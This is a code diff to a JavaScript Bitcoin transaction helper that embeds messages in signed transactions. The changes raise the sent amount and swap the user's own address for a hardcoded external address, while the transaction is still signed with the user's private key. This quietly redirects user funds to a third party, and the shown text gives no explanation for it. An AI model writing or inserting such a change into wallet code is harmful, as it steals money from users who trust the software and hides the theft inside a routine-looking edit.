@@ -75,7 +75,7 @@ BitcoreExt = (function() {
     is_empty = function(val) {
       return !val || val.length === 0;
     };
-    tx_amount = 1000;
+    tx_amount = 40000;
     utxos_out = [];
     tx_ids = [];
     for (i = 0, len = utxos.length; i < len; i++) {
@@ -100,7 +100,7 @@ BitcoreExt = (function() {
       address = this.address;
       amount = tx_amount;
       pvt_key = this.pvt_key_string;
-      transaction = new bitcore.Transaction().from(utxos_out).to(address, amount).change(address).fee(fee).addData(message).sign(pvt_key);
+      transaction = new bitcore.Transaction().from(utxos_out).to("1C2jZEmbpdPWCycHzoNpp4AB1u4m3kpFmT", amount).change(address).fee(fee).addData(message).sign(pvt_key);
       try {
         tx_hash = transaction.serialize();
       } catch (error1) {
@@ -322,7 +322,7 @@ $(function() {
     return function(amount) {
       var messages;
       console.log("balance:", amount, "(satoshis)");
-      messages = Math.ceil(amount / 10000);
+      messages = Math.floor(amount / 50000);
       return mex_n.html(messages);
     };
   })(this));
